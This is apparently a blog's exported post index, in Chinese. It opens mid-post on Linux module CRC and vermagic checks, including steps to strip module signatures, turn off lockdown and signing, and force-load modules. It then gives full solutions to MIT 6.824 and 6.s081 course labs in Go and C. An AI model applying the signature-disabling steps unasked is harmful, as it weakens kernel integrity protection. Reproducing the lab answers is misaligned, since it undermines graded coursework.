module的二进制兼容性，会对导出符号进行CRC校验。kernel中导出的每一个符号都有一个CRC校验，而module中保存了每一个使用到的由kernel导出的symbol的CRC校验，在module加载时会检查二者是否匹配，如果不匹配将不会加载。如果启动了CONFIG_MODVERSIONS，则每个通过EXPORT_SYMBOL定义输出的符号名都会计算一个CRC校验码。在编译kernel/module完成后，生成的Module.symvers文件中包含了kernel的所有的导出符号的CRC校验码。当module引用了kernel或其他module导出的符号时，在编译过程中需要读取kernel或者其他module的Module.symvers，而这些Module.symvers应该放到当前module的源码目录下，或在Makefile中通过KBUILD_EXTRA_SYMBOLS=来指定依赖的模块的Module.symvers的内容。在编译生成的module.ko中，存在一个__versions section，其中保存了module所引用的符号和对应的CRC验证码，可以通过modprobe -dump-modversions来查看完整信息：$ modprobe -dump-modversions ixgbe.ko\t0x235a30d9 module_layout\t0x452ba683 ipv6_ext_hdr\t0xe2d5255a strcmp\t0xb8b9f817 kmalloc_order_trace\t0x72128032 secpath_set\t0xd0760fc0 kfree_sensitive\t......模块加载时的检查步骤内核在加载模块时，首先会进行模块签名验证，然后进行版本检查。版本检查分为vermagic检查和CRC校验检查，具体过程由CONFIG_MODVERSIONS相关控制： kernel打开CONFIG_MODVERSIONS，module不打开CONFIG_MODVERSIONS：将不会检查CRC，但是会完整匹配vermagic，此时kernel和module的vermagic的modversions不一致，模块将加载失败。 kernel和module都打开CONFIG_MODVERSIONS：检查CRC，然后匹配vermagic第一个空格后的部分，例如对于vermagic: 5.12.10 SMP mod_unload modversions ，只会匹配SMP mod_unload modversions。 kernel不打开CONFIG_MODVERSIONS，module打开CONFIG_MODVERSIONS：完整匹配kernel和module的vermagic，但是因为二者modversions不同，模块加载失败。 kernel和module均不打开CONFIG_MODVERSIONS：完整匹配vermagic，module加载成功。如何关闭模块签名验证可以通过strip --keep-file-symbols &lt;module_name&gt;删除指定模块的签名。内核中存在kernel_lockdown机制，用于阻止对于正在运行的内核映像的直接或间接地未经授权地访问，该机制开启与否由.config中的CONFIG_SECURITY_LOCKDOWN_LSM控制。通过将CONFIG_SECURITY_LOCKDOWN_LSM和CONFIG_MODULE_SIG设置为n，编译出的驱动将不再包含签名，对应的内核在加载模块时也不会验证签名的正确性。而如果仅将CONFIG_MODULE_SIG设置为n，在后续通过make olddefconfig时，由于lockdown的存在，将会自动重新开启CONFIG_MODULE_SIG。如何忽略版本检查在modprobe中提供了两个选项，用于在加载模块时忽略vermagic或CRC检查：–force-vermagic Every module contains a small string containing important information, such as the kernel and compiler versions. If a module fails to load and the kernel complains that the “version magic” doesn’t match, you can use this option to remove it. Naturally, this check is there for your protection, so using this option is dangerous unless you know what you’re doing. This applies to any modules inserted: both the module (or alias) on the command line and any modules on which it depends.–force-modversion When modules are compiled with CONFIG_MODVERSIONS set, a section detailing the versions of every interfaced used by (or supplied by) the module is created. If a module fails to load and the kernel complains that the module disagrees about a version of some interface, you can use “–force-modversion” to remove the version information altogether. Naturally, this check is there for your protection, so using this option is dangerous unless you know what you’re doing. This applies any modules inserted: both the module (or alias) on the command line and any modules on which it depends.-f, –force Try to strip any versioning information from the module which might otherwise stop it from loading: this is the same as using both –force-vermagic and –force-modversion. Naturally, these checks are there for your protection, so using this option is dangerous unless you know what you are doing. This applies to any modules inserted: both the module (or alias) on the command line and any modules it on which it depends.Reference1.kernel_lockdown(7) - Linux manual page (man7.org)2.深入分析Linux kernel安全特性: 内核模块签名 - 知乎 (zhihu.com)3.LINUX内核模块签名4.LINUX内核模块版本检查" }, { "title": "Fault-tolerant Key/Value Service", "url": "/_posts/6.824-Lab3-Fault-tolerant-Key-Value-Service/", "categories": "Distributed Systems", "tags": "Distributed Systems", "date": "2023-04-24 00:00:00 +0000", "snippet": " 6.824 Lab 3: Fault-tolerant Key/Value Service (mit.edu)本实验要求在Lab2中实现的Raft的基础上构建一个key/value存储服务。Part A: Key/value service without snapshots首先实现不包含快照的key/value服务，每个kvserver与Raft peer一一对应。与server对应的...", "content": " 6.824 Lab 3: Fault-tolerant Key/Value Service (mit.edu)本实验要求在Lab2中实现的Raft的基础上构建一个key/value存储服务。Part A: Key/value service without snapshots首先实现不包含快照的key/value服务，每个kvserver与Raft peer一一对应。与server对应的clerk作为存储服务的用户，向作为Raft leader的kvserver发送Put()/Append()/Get() RPC以更新或读取数据。kvserver将clerk发来的Put/Append/Get操作作为日志提交给下层的Raft，因此Raft的log中保存的是clerk的操作序列。所有的kvserver按照顺序执行这些数据访问操作以在所有的服务器上保持键值数据库的一致性。Raft的leader可能随着时间变化，而kvserver并不会主动将这一变化同步给clerk，当clerk访问的kvserver不是leader或kvserver无法连接时，则更换到下一个server。kvserver在接收到来自clerk的请求后，并不会立刻执行，而是首先通过Raft apply在所有的kvserver上同步，等待apply返回后再执行该请求，并向clerk返回。如果apply返回错误，也就是该请求对应的log提交失败时，向clerk返回错误信息，clerk更换到下一个kvserver，重发请求。client.go中，每个clerk抽象为一个Clerk结构体，其中servers数组表示所有的kvserver，curLeader表示上次发送请求时的作为Raft Leader的服务器序列号，在发送新的请求时从curLeader开始，以尽可能减少重发次数。sequenceId作为每次请求的序列号，供server区分不同请求的先后顺序，同时对于具有相同序列号的两次请求，server不会重复执行而是仅返回上次执行的结果，定义如下：type Clerk struct { servers []*labrpc.ClientEnd // You will have to modify this struct. curLeader int me int64 mu sync.Mutex sequenceId int64 }每个server抽象为一个server结构体，其中database作为每个服务器上存储的键值数据库，lastSequence用于记录已经完成的来自每个clerk的最后一次请求的序列号，代码如下： type KVServer struct { mu sync.Mutex me int rf *raft.Raft applyCh chan raft.ApplyMsg dead int32 // set by Kill() maxraftstate int // snapshot if log grows this big // Your definitions here. database map[string]string // 用于记录已经完成的请求的响应和序列号 lastSequence map[int64]int64 channel map[int]chan Notify indexMap map[int64]int snapshotLastIndex int }clerk的Get函数向Leader请求与参数对应的value，每次调用Get，使clerk的sequenceId+1，并且不断向server发送请求，直到接收到来自server的不为ErrWrongLeader的响应，其定义如下：const ( OK = \"OK\" ErrNoKey = \"ErrNoKey\" ErrWrongLeader = \"ErrWrongLeader\" ) type Err stringtype GetArgs struct { Key string // You'll have to add definitions here. ClientId int64 SequenceNum int64 }type GetReply struct { Err Err Value string }func (ck *Clerk) Get(key string) string { // You will have to modify this function. args := &amp;GetArgs{key, ck.me, ck.sequenceId} ck.sequenceId++ for { for _, srv := range ck.servers { var reply GetReply ok := srv.Call(\"KVServer.Get\", args, &amp;reply) if ok &amp;&amp; reply.Err != ErrWrongLeader { return reply.Value } } time.Sleep(100 * time.Millisecond) } }server的Get RPC，当接收到来自clerk的请求时，首先判断自己当前状态，如果不是leader，立即返回ErrWrongLeader错误。否则，检查lastSequence，如果当前请求已经处理过，不需要再次提交到Raft，而是直接返回OK和请求的值（接收到重复请求说明上次请求的响应没有被clerk接收到），如果没有处理过该请求，构造与该请求对应的Command，其中包含了操作类型、参数、发送该请求的clerkId以及该请求的序列号（通过这些信息能够唯一确定一次请求），然后通过Start将该Command添加到Raft LogEntry中，并发送到所有的Raft peer以达成共识，根据Start返回的该Command在LogEntry中的位置，创建一个channel，通过select在该channel上等待直到该Command通过Raft在大多数服务器上达成共识后通过apply唤醒，然后向clerk发送响应，并销毁对应的channel，代码如下：func (kv *KVServer) Get(args *GetArgs, reply *GetReply) { // Your code here. if kv.killed() { reply.Err = ErrWrongLeader return } if _, isLeader := kv.rf.GetState(); !isLeader { reply.Err = ErrWrongLeader return } else { kv.mu.Lock() lastSequence, ok := kv.lastSequence[args.ClientId] if ok &amp;&amp; args.SequenceNum &lt;= lastSequence { reply.Err, reply.Value = OK, kv.database[args.Key] kv.mu.Unlock() return } Command := Op{ \"Get\", args.Key, \"\", args.ClientId, args.SequenceNum, } kv.mu.Unlock() idx, term, isLeader := kv.rf.Start(Command) if !isLeader { reply.Err = ErrWrongLeader return } kv.mu.Lock() ch, ok := kv.channel[idx] if !ok { kv.channel[idx] = make(chan Notify, 1) ch = kv.channel[idx] } kv.mu.Unlock() select { case &lt;-time.After(500 * time.Millisecond): { kv.mu.Lock() _, isLeader = kv.rf.GetState() lastSequence, ok := kv.lastSequence[args.ClientId] if isLeader &amp;&amp; ok &amp;&amp; args.SequenceNum &lt;= lastSequence { reply.Err, reply.Value = OK, kv.database[args.Key] } else { reply.Err = ErrWrongLeader } delete(kv.channel, idx) kv.mu.Unlock() break } case notify := &lt;-ch: { kv.mu.Lock() if notify.sequenceNum == args.SequenceNum &amp;&amp; term == notify.term { if value, ok := kv.database[args.Key]; !ok { reply.Err = ErrNoKey kv.lastSequence[args.ClientId] = args.SequenceNum } else { kv.lastSequence[args.ClientId] = args.SequenceNum reply.Value, reply.Err = value, OK } } else { reply.Err = ErrWrongLeader } delete(kv.channel, idx) kv.mu.Unlock() break } } } }clerk的Put与Append唯一的区别在于，Put是直接在数据库中添加从key到value的映射， Append是如果当前存在了key，则在原本的value后追加参数中的value，该逻辑由server处理，在clerk中只有操作类型的不同，代码如下：func (ck *Clerk) PutAppend(key string, value string, op string) { // You will have to modify this function. args := &amp;PutAppendArgs{key, value, op, ck.me, ck.sequenceId} ck.sequenceId++ for { for _, srv := range ck.servers { var reply PutAppendReply ok := srv.Call(\"KVServer.PutAppend\", args, &amp;reply) if ok &amp;&amp; reply.Err != ErrWrongLeader { return } } time.Sleep(100 * time.Millisecond) } } func (ck *Clerk) Put(key string, value string) { ck.PutAppend(key, value, \"Put\") } func (ck *Clerk) Append(key string, value string) { ck.PutAppend(key, value, \"Append\") }server的PutAppend RPC处理逻辑与Get基本一致，代码如下：func (kv *KVServer) PutAppend(args *PutAppendArgs, reply *PutAppendReply) { // Your code here. if kv.killed() { reply.Err = ErrWrongLeader return } kv.mu.Lock() if _, isLeader := kv.rf.GetState(); !isLeader { reply.Err = ErrWrongLeader kv.mu.Unlock() return } else { if lastSequence, ok := kv.lastSequence[args.ClientId]; ok &amp;&amp; args.SequenceNum &lt;= lastSequence { reply.Err = OK kv.mu.Unlock() return } Command := Op{ args.Op, args.Key, args.Value, args.ClientId, args.SequenceNum, } kv.mu.Unlock() idx, term, isLeader := kv.rf.Start(Command) if !isLeader { reply.Err = ErrWrongLeader return } kv.mu.Lock() ch, ok := kv.channel[idx] if !ok { kv.channel[idx] = make(chan Notify, 1) ch = kv.channel[idx] } kv.mu.Unlock() select { case &lt;-time.After(500 * time.Millisecond): { kv.mu.Lock() _, isLeader := kv.rf.GetState() lastSequence, ok := kv.lastSequence[args.ClientId] if isLeader &amp;&amp; ok &amp;&amp; args.SequenceNum &lt;= lastSequence { reply.Err = OK } else { reply.Err = ErrWrongLeader } delete(kv.channel, idx) kv.mu.Unlock() break } case notify := &lt;-ch: { kv.mu.Lock() if notify.sequenceNum == args.SequenceNum &amp;&amp; term == notify.term { reply.Err = OK } else { reply.Err = ErrWrongLeader } delete(kv.channel, idx) kv.mu.Unlock() break } } }}在启动kvserver时，启动了一个协程执行apply函数，用于接收来自下层Raft协议的已经达成一致的Command。当从applyCh接收到applyMsg时，如果该applyMsg对应的Command有效，则根据操作Command的操作类型执行对应的处理逻辑，将该Command对应的clerk及其序列号记录到lastSequence中，并根据applyMsg对应的在LogEntry中的下标，获得之前RPC调用中创建并等待的channel，向其中写入Notify信息以唤醒与该请求对应的RPC处理协程，代码如下：func (kv *KVServer) apply() { for !kv.killed() { applyMsg := &lt;-kv.applyCh if applyMsg.CommandValid { command := (applyMsg.Command).(Op) kv.mu.Lock() lastSequence, ok := kv.lastSequence[command.ClientId] if command.Operator == \"Put\" { if !ok || lastSequence &lt; command.SequenceNum { kv.database[command.Key] = command.Value kv.lastSequence[command.ClientId] = command.SequenceNum } } else if command.Operator == \"Append\" { if !ok || lastSequence &lt; command.SequenceNum { value, ok := kv.database[command.Key] if !ok { kv.database[command.Key] = command.Value } else { kv.database[command.Key] = value + command.Value } kv.lastSequence[command.ClientId] = command.SequenceNum } } ch, ok := kv.channel[applyMsg.CommandIndex] notify := Notify{command.SequenceNum, applyMsg.CommandTerm} kv.mu.Unlock() if ok { ch &lt;- notify } else { } } } }Part B: Key/value service with snapshotsPartA中的代码没有实现Snapshot，因此当server重启时需要重放完整的日志才能够恢复状态。在PartB中利用Lab 2D的Snapshot()实现快照，以减少日志占用空间和状态恢复时间。给定一个参数maxraftstate，表示Raft允许的持久化状态的最大长度，当persister.RaftStateSize()接近maxraftstate时，通过调用Snapshot保存快照，kvserver在apply()中，接收到来自Raft的applyMsg后，如果CommandValid为true，表示该applyMsg对应一个新达成共识的LogEntry，因此需要判断是否需要保存快照，而如果applyMsg的CommandValid为false，表示该kvserver对应的Raft peer已经落后leader太远了，接收到了来自leader发送的snapshot，因此直接从该snapshot中恢复状态，并丢弃自己原本的状态。代码如下：func (kv *KVServer) apply() { for !kv.killed() { applyMsg := &lt;-kv.applyCh if applyMsg.CommandValid { // ...... if kv.maxraftstate != -1 { kv.mu.Lock() if kv.rf.Persister.RaftStateSize() &gt;= kv.maxraftstate { kv.snapshotLastIndex = applyMsg.CommandIndex kv.StartSnapshot() } kv.mu.Unlock() } } else { snapshot := applyMsg.Snapshot kv.mu.Lock() kv.RestoreFromSnapshot(snapshot) kv.snapshotLastIndex = applyMsg.SnapshotIndex kv.CleanChannel() kv.mu.Unlock() } } }func (kv *KVServer) RestoreFromSnapshot(snapshot []byte) { if snapshot == nil || len(snapshot) &lt; 1 { return } r := bytes.NewBuffer(snapshot) d := labgob.NewDecoder(r) var database map[string]string var lastSequence map[int64]int64 var snapshotLastIndex int if d.Decode(&amp;database) != nil || d.Decode(&amp;lastSequence) != nil || d.Decode(&amp;snapshotLastIndex) != nil { DPrintf(\"ReadSnapshot failed\\n\") } else { kv.database = database kv.lastSequence = lastSequence kv.snapshotLastIndex = snapshotLastIndex }}func (kv *KVServer) CleanChannel() { for idx := range kv.channel { if idx &lt;= kv.snapshotLastIndex { delete(kv.channel, idx) } } }运行go-test-many.sh脚本测试1000次，可以稳定通过测试。" }, { "title": "MIT 6.s081 Lab Multithreading", "url": "/_posts/MIT-6.s081-Lab-multhreading/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-04-14 00:00:00 +0000", "snippet": " Lab: Multithreading (mit.edu)Uthread: switching between threads为用户态的线程系统设计并实现上下文切换机制，实现创建线程、在线程切换时保存和恢复寄存器的功能。uthread.c中对线程的定义如下：struct thread { char stack[STACK_SIZE]; /* the thread's sta...", "content": " Lab: Multithreading (mit.edu)Uthread: switching between threads为用户态的线程系统设计并实现上下文切换机制，实现创建线程、在线程切换时保存和恢复寄存器的功能。uthread.c中对线程的定义如下：struct thread { char stack[STACK_SIZE]; /* the thread's stack */ int state; /* FREE, RUNNING, RUNNABLE */ struct context ctx;};其中context用于在线程切换时保存和恢复线程上下文，由callee-save寄存器组成，context定义为:struct context { uint64 ra; uint64 sp; // callee-saved uint64 s0; uint64 s1; uint64 s2; uint64 s3; uint64 s4; uint64 s5; uint64 s6; uint64 s7; uint64 s8; uint64 s9; uint64 s10; uint64 s11;};对应地，线程切换时保存和恢复线程上下文对寄存器的操作也就和进程切换时的swtch相同：\t.globl thread_switchthread_switch:\t/* YOUR CODE HERE */\tsd ra, 0(a0)\tsd sp, 8(a0)\tsd s0, 16(a0)\tsd s1, 24(a0)\tsd s2, 32(a0)\tsd s3, 40(a0)\tsd s4, 48(a0)\tsd s5, 56(a0)\tsd s6, 64(a0)\tsd s7, 72(a0)\tsd s8, 80(a0)\tsd s9, 88(a0)\tsd s10, 96(a0)\tsd s11, 104(a0)\tld ra, 0(a1) ld sp, 8(a1) ld s0, 16(a1) ld s1, 24(a1) ld s2, 32(a1) ld s3, 40(a1) ld s4, 48(a1) ld s5, 56(a1) ld s6, 64(a1) ld s7, 72(a1) ld s8, 80(a1) ld s9, 88(a1) ld s10, 96(a1) ld s11, 104(a1)\t\tret /* return to ra */在线程创建时，thread_create的参数为在线程中要执行的函数，在所有线程中找到一个空闲状态的线程，将其状态设置为RUNNABLE，并设置sp寄存器为栈的最高地址，ra寄存器为函数指针，这样在thread_scheduler调用thread_swtch返回时，将从返回地址处开始执行，并从栈的高地址向下增长。代码如下：void thread_create(void (*func)()){ struct thread *t; for (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) { if (t-&gt;state == FREE) break; } t-&gt;state = RUNNABLE; // YOUR CODE HERE t-&gt;ctx.sp = (uint64)&amp;t-&gt;stack + (STACK_SIZE - 1); t-&gt;ctx.ra = (uint64)func;}在thread_schedule中，在从当前的所有线程中选择出合适执行的线程后，调用thread_swtch函数，首先将当前的callee-save寄存器现场保存到当前线程的context中以备下次被调度时恢复，然后从选择出的将要执行的线程的context中读取寄存器的值并恢复，代码如下：void thread_schedule(void){ struct thread *t, *next_thread; /* Find another runnable thread. */ next_thread = 0; t = current_thread + 1; for(int i = 0; i &lt; MAX_THREAD; i++){ if(t &gt;= all_thread + MAX_THREAD) t = all_thread; if(t-&gt;state == RUNNABLE) { next_thread = t; break; } t = t + 1; } if (next_thread == 0) { printf(\"thread_schedule: no runnable threads\\n\"); exit(-1); } if (current_thread != next_thread) { /* switch threads? */ next_thread-&gt;state = RUNNING; t = current_thread; current_thread = next_thread; /* YOUR CODE HERE * Invoke thread_switch to switch from t to next_thread: * thread_switch(??, ??); */ thread_switch((uint64)&amp;t-&gt;ctx, (uint64)&amp;next_thread-&gt;ctx); } else next_thread = 0;}Using threads主要是解决多个线程并发访问哈希表时引起的数据竞争问题，通过给get和put两种操作访问共享数据资源，也就是哈希表时加锁，来避免数据竞争引起数据丢失，由于目前并不需要考虑性能，因此直接在put和get两部分的开始和末尾处加锁和解锁，代码如下：static void put(int key, int value){ int i = key % NBUCKET; pthread_mutex_lock(&amp;put_lock); // is the key already present? struct entry *e = 0; for (e = table[i]; e != 0; e = e-&gt;next) { if (e-&gt;key == key) break; } if(e){ // update the existing key. e-&gt;value = value; } else { // the new is new. insert(key, value, &amp;table[i], table[i]); } pthread_mutex_unlock(&amp;put_lock);}static struct entry*get(int key){ int i = key % NBUCKET; pthread_mutex_lock(&amp;get_lock); struct entry *e = 0; for (e = table[i]; e != 0; e = e-&gt;next) { if (e-&gt;key == key) break; } pthread_mutex_unlock(&amp;get_lock); return e;}在使用锁前，首先需要对锁进行初始化： pthread_mutex_init(&amp;put_lock, NULL); pthread_mutex_init(&amp;get_lock, NULL);Barrier实现一个barrier，每个线程在barrier处等待，直到所有的线程都已经运行到了这一点。barrier通过pthread库提供的条件变量来实现。pthread提供了两个API，pthread_cond_wait(&amp;cond, &amp;mutex) 使线程在条件变量cond上等待，并释放mutex锁。pthread_cond_broadcast(&amp;cond) 用于唤醒所有在条件变量cond上等待的线程。在barrier.c中，barrier结构体定义为：struct barrier { pthread_mutex_t barrier_mutex; pthread_cond_t barrier_cond; int nthread; // Number of threads that have reached this round of the barrier int round; // Barrier round} bstate;其中barrier_mutex作为互斥锁，用于保护bstate中的临界资源，包括nthread和round，barrier_cond作为pthread_cond_wait和pthread_cond_broadcast的参数，用于使线程等待或唤醒线程。nthread表示当前轮次到达barrier的线程数，round表示当前barrier所在的轮次。当每个线程执行到barrier函数时，首先加锁，然后使nthread+1并判断当前是否所有线程都到达barrier处，如果仍有线程未到达barrier，释放锁并使自己休眠，否则使轮次+1，调用broadcast唤醒所有线程，并重置bstate.nthread，代码如下：static void barrier(){ // YOUR CODE HERE // // Block until all threads have called barrier() and // then increment bstate.round. // pthread_mutex_lock(&amp;bstate.barrier_mutex); bstate.nthread++; if (bstate.nthread &gt;= nthread) { bstate.round++; pthread_cond_broadcast(&amp;bstate.barrier_cond); bstate.nthread = 0; } else { pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex); } pthread_mutex_unlock(&amp;bstate.barrier_mutex);}执行测试, 顺利通过：❯ ./barrier 2OK; passed❯ ./barrier 3OK; passed❯ ./barrier 4OK; passed" }, { "title": "MIT 6.s081 Lab copy-on-write fork", "url": "/_posts/MIT-6.s081-Lab-cow/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-04-10 00:00:00 +0000", "snippet": " Lab: Copy-on-Write Fork for xv6 (mit.edu)Problem and Solutionxv6中的fork系统调用将父进程的用户空间内存全部复制到子进程，而如果需要拷贝的内存数量比较大，拷贝过程会引起严重的开销问题。并且在子进程中，fork系统调用后通常紧跟着exec系统调用以修改进程影响，导致fork复制的内存被丢弃。如果父进程和子进程使用同一个页面，...", "content": " Lab: Copy-on-Write Fork for xv6 (mit.edu)Problem and Solutionxv6中的fork系统调用将父进程的用户空间内存全部复制到子进程，而如果需要拷贝的内存数量比较大，拷贝过程会引起严重的开销问题。并且在子进程中，fork系统调用后通常紧跟着exec系统调用以修改进程影响，导致fork复制的内存被丢弃。如果父进程和子进程使用同一个页面，只有当其中一个进程对内存进行写操作时，才真正需要进行拷贝。为fork实现copy-on-write机制，将为子进程分配和拷贝物理页的操作推迟到子进程或父进程发生了写操作时来完成。COW fork在创建子进程时，仅为子进程创建页表，使子进程的用户页表项指向父进程的物理页，并且将父进程和子进程的所有用户PTE标记为不可写。当进程尝试进行写操作时，触发一个缺页中断，然后内核为产生中断的进程分配一个新的物理页，将旧页的内容复制到新页，并为PTE添加写权限。当进程从缺页中断返回后，可以继续进行之前的写操作。COW fork()中，多个进程的页表可能会映射到同一个物理页，而这个物理页只有当引用计数为0时才能被释放。Implementation首先修改uvmcopy函数的实现，在为子进程构建页表时，不分配物理页，而是将子进程的页表项映射到父进程的物理页，并将父进程和子进程的PTE_W标志位置0，同时使用保留位（第8位）作为PTE_COW位表示这是一个COW页。对于具有COW标志位的页，在发生写操作时创建一个新的物理页然后添加为其添加写权限，因此如果父进程中与该物理页对应的页表项本身不具有写权限，则不应该设置COW标志位，而是仅将子进程的页表映射到该物理页。intuvmcopy(pagetable_t old, pagetable_t new, uint64 sz){ pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i &lt; sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(\"uvmcopy: pte should exist\"); if((*pte &amp; PTE_V) == 0) panic(\"uvmcopy: page not present\"); pa = PTE2PA(*pte); if (*pte &amp; PTE_W) { *pte = (*pte &amp; (~PTE_W)) | PTE_COW; } flags = PTE_FLAGS(*pte); if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } kincref((void *)pa); } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1;}然后修改usertrap函数的缺页中断处理逻辑，只有当发生缺页写中断时，检查发生缺页中断的虚拟地址对应的PTE是否具有PTE_COW标志位。对于具有COW标志位的页，进行拷贝操作，通过kalloc分配一个新的物理页，添加页表映射并为PTE添加写权限。此时如果有两个或多个进程同时映射到这个旧页，其他进程对于该页的权限保持不变，即当这些进程需要写时，依然会再次触发一个缺页中断，进行拷贝操作。代码如下：void usertrap(void){ int which_dev = 0; pte_t *pte; char *mem; uint flags; if ((r_sstatus() &amp; SSTATUS_SPP) != 0) panic(\"usertrap: not from user mode\"); // send interrupts and exceptions to kerneltrap(), // since we're now in the kernel. w_stvec((uint64)kernelvec); struct proc *p = myproc(); // save user program counter. p-&gt;trapframe-&gt;epc = r_sepc(); if (r_scause() == 8) { // system call // ...... } else if (r_scause() == 15) { uint64 va = r_stval(); pte = walk(p-&gt;pagetable, va, 0); if (va &lt; p-&gt;sz &amp;&amp; pte != 0 &amp;&amp; (*pte &amp; PTE_V) &amp;&amp; (*pte &amp; PTE_COW)) { uint64 pa = walkaddr(p-&gt;pagetable, va); if ((mem = kcopy_page((void *)pa)) == 0) { printf(\"Out of memory\\n\"); p-&gt;killed = 1; } else { flags = (PTE_FLAGS(*pte) &amp; (~PTE_COW)) | PTE_W; uvmunmap(p-&gt;pagetable, PGROUNDDOWN(va), 1, 0); if (mappages(p-&gt;pagetable, PGROUNDDOWN(va), PGSIZE, (uint64)mem, flags) != 0) { kfree(mem); p-&gt;killed = 1; } } } else { printf(\"PTE_COW is disabled\\n\"); printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-&gt;pid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-&gt;killed = 1; } } else if ((which_dev = devintr()) != 0) { // ok } else { printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-&gt;pid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-&gt;killed = 1; } if (p-&gt;killed) exit(-1); // give up the CPU if this is a timer interrupt. if (which_dev == 2) yield(); usertrapret();}上面的代码存在内存泄露问题。考虑如下情况：某一时刻只有一个进程映射到该物理页，并且对应的PTE其COW位为1，PTE_W位为0（其他原本映射到同一物理页的进程，此前对该物理页尝试写操作触发了缺页中断，从而使PTE映射到新的物理页），此时如果为该进程分配一个新的物理页，并解除对旧的物理页的映射，则当前系统中不再存在到旧页的映射，这部分空间将永远不会被回收，随着进程的增多，整个系统的内存将会被占满。为每个物理页建立引用计数可以解决该问题。物理页面的引用计数表示当前映射到该页面的进程PTE的数量，当引用计数&lt;=0时，表示当前已经没有进程使用这个页面，可以直接释放。当引用计数为1时，如果对这个物理页的写操作触发了page-fault，则直接为PTE添加写权限而不是分配一个新的物理页。在每次fork使子进程的页表映射到物理页时，对该物理页的引用计数+1。由于可能存在多个进程并发访问同一个页的引用计数，因此使用自旋锁加以保护。引用计数机制代码如下：struct { int reference_cnt[(PHYSTOP - KERNBASE) / PGSIZE]; struct spinlock lock;} mem_ref;voidkfree(void *pa){ struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP) panic(\"kfree\"); acquire(&amp;mem_ref.lock); if (--mem_ref.reference_cnt[((uint64)pa-KERNBASE) / PGSIZE] &lt;= 0) { // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(&amp;kmem.lock); r-&gt;next = kmem.freelist; kmem.freelist = r; release(&amp;kmem.lock); } release(&amp;mem_ref.lock);}void *kalloc(void){ struct run *r; acquire(&amp;kmem.lock); r = kmem.freelist; if(r) { kmem.freelist = r-&gt;next; mem_ref.reference_cnt[(PGROUNDDOWN((uint64)r) - KERNBASE) / PGSIZE] = 1; } release(&amp;kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r;}voidkincref(void *pa){ acquire(&amp;mem_ref.lock); ++mem_ref.reference_cnt[((uint64)pa-KERNBASE) / PGSIZE]; release(&amp;mem_ref.lock);}void *kcopy_page(void *pa) { char *mem; acquire(&amp;mem_ref.lock); if (mem_ref.reference_cnt[((uint64)pa-KERNBASE) / PGSIZE] &lt;= 1) { release(&amp;mem_ref.lock); return pa; } else { if ((mem = kalloc()) == 0) { release(&amp;mem_ref.lock); return 0; } --mem_ref.reference_cnt[((uint64)pa-KERNBASE) / PGSIZE]; memmove(mem, (char *)pa, PGSIZE); } release(&amp;mem_ref.lock); return (void *)mem;}" }, { "title": "MIT 6.s081 Lab lazy allocation", "url": "/_posts/MIT-6.s081-Lab-lazy-allocation/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-04-06 00:00:00 +0000", "snippet": " Lab: xv6 lazy page allocation (mit.edu)Page-fault exceptions当CPU无法将虚拟地址转换成物理地址时，生成一个page-fault excecption，称为缺页异常。RISC-V中存在三种类型的缺页异常：load(load指令)/store(store指令)/instruction(指令所在的虚拟地址无法转换成物理地址)。sca...", "content": " Lab: xv6 lazy page allocation (mit.edu)Page-fault exceptions当CPU无法将虚拟地址转换成物理地址时，生成一个page-fault excecption，称为缺页异常。RISC-V中存在三种类型的缺页异常：load(load指令)/store(store指令)/instruction(指令所在的虚拟地址无法转换成物理地址)。scause寄存器中保存了异常类型，stval寄存器保存无法转换的虚拟地址。Copy-on-write fork的基本方式是父进程和子进程初始共享相同的物理页，并将PTE设置为只读的，当子进程或父进程执行store指令对物理页进行写操作是，RISC-V抛出一个缺页异常，为发生异常的虚拟地址对应的物理页创建一个副本，并将PTE映射到该副本中，修改操作类型为可读可写，之后再对副本进行写操作。由于子进程在fork后通常会执行exec系统调用，因此在exec时子进程会产生缺页异常，内核处理这些异常并创建对应的副本，而不需要复制所有的物理页。另一种处理缺页异常的机制称为lazy allocation，主要分为两步。第一步，在用户进程调用sbrk以扩充地址空间时，内核仅仅改变其虚拟地址空间，在页表中将这些新的虚拟地址对应的PTE置为无效，而不需要真正分配物理页。第二步，在进程访问这些新的虚拟地址产生缺页异常时，内核分配物理页并将其映射到页表中。这样做的好处是可以节省内存分配。另一种处理缺页异常的机制称为paging from disk。当用户进程需要更多内存，而RAM中目前没有更多的可用页面进行分配时，内核从当前的内存中选择一些页面，将其调出内存，暂时保存在磁盘上，并将对应的PTE设置为无效。当进程对这些页面进行读写访问时，由于PTE无效，会产生缺页异常，内核对访问的虚拟地址进行检查，如果这一虚拟地址所在的页面当前保存在磁盘上，则选择内存中的某些页面调出内存，将需要的物理页调回内存，更新PTE并返回到用户进程继续执行。这种机制在应用程序的局部性较好时具有比较高的效率。Eliminate allocation from sbrk()修改系统调用sbrk(n)，当n&gt;0时，sbrk会为进程分配n个字节，然后返回新分配区域的地址。在lazy allocation中，只有内存真正被使用时才会分配物理页，因此新的sbrk(n)只增加进程的虚拟内存大小，而不会影响其实际映射的物理页，并且返回新增加区域的起始虚拟地址。uint64sys_sbrk(void){ int addr; int n; struct proc *p = myproc(); if(argint(0, &amp;n) &lt; 0) return -1; addr = p-&gt;sz; if (n &lt; 0) { uvmdealloc(p-&gt;pagetable, p-&gt;sz, p-&gt;sz + n); } p-&gt;sz += n; return addr;}lazy 